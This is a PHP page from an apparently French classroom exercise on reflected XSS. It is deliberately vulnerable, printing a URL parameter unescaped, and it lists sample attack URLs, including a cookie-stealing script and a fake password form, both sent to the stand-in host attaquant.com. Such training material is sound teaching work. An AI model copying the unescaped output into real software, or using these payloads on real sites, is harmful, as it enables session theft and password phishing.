<?php
/**
 * PARTIE B - TRANSMISSION URL VULNERABLE (XSS Reflte)
 * 
 * [ATTENTION] CE CODE EST VOLONTAIREMENT VULNERABLE - NE PAS UTILISER EN PRODUCTION
 * 
 * Failles presentes :
 * - Affichage direct du parametre GET sans Echappement
 * - Injection XSS possible via l'URL
 */

require_once __DIR__ . '/../init.php';
require_once __DIR__ . '/../functions.php';
include __DIR__ . '/../templates/header.php';

// [VULNERABLE] VULNERABLE : Parametre affiche directement sans Echappement
$nom = isset($_GET['nom']) ? $_GET['nom'] : 'Visiteur';
?>

<h2> Partie B - Transmission des donnes dans l'URL</h2>

<div class="danger-box">
    <strong>[VULN] VERSION VULNERABLE</strong><br>
    Le parametre GET est affiche sans Echappement HTML. Faille XSS reflte.
</div>

<h3>Bienvenue !</h3>
<!-- [VULNERABLE] VULNERABLE : Affichage direct sans htmlspecialchars() -->
<p>Bonjour, <strong><?= $nom ?></strong> !</p>

<h3> Exploitation possible</h3>
<p>Testez ces URLs malveillantes :</p>

<div class="code-block">
<!-- XSS simple -->
bonjour_vuln.php?nom=&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- Vol de cookie -->
bonjour_vuln.php?nom=&lt;script&gt;document.location='http://attaquant.com/steal.php?c='+document.cookie&lt;/script&gt;

<!-- Injection HTML -->
bonjour_vuln.php?nom=&lt;img src=x onerror="alert('XSS')"&gt;

<!-- Injection de formulaire -->
bonjour_vuln.php?nom=&lt;form action="http://attaquant.com"&gt;&lt;input name="mdp" type="password"&gt;&lt;button&gt;Connexion&lt;/button&gt;&lt;/form&gt;
</div>

<h3> Testez vous-meme</h3>
<form method="GET">
    <label for="nom">Votre nom :</label>
    <input type="text" name="nom" id="nom" value="<?= $nom ?>">
    <button type="submit">Envoyer</button>
</form>

<h3> Questions</h3>
<ol>
    <li>Quelle est la faille dans ce code ?</li>
    <li>Comement un attaquant peut-il voler les cookies d'un utilisateur ?</li>
    <li>Quelle fonction PHP permet de corriger cette faille ?</li>
    <li>Pourquoi cette attaque est-elle appele "XSS reflte" ?</li>
</ol>

<p><a href="../secure/bonjour_secure.php?nom=Test"> Voir la version securisee</a></p>

    </main>\r\n</div>\r\n</body>\r\n</html>
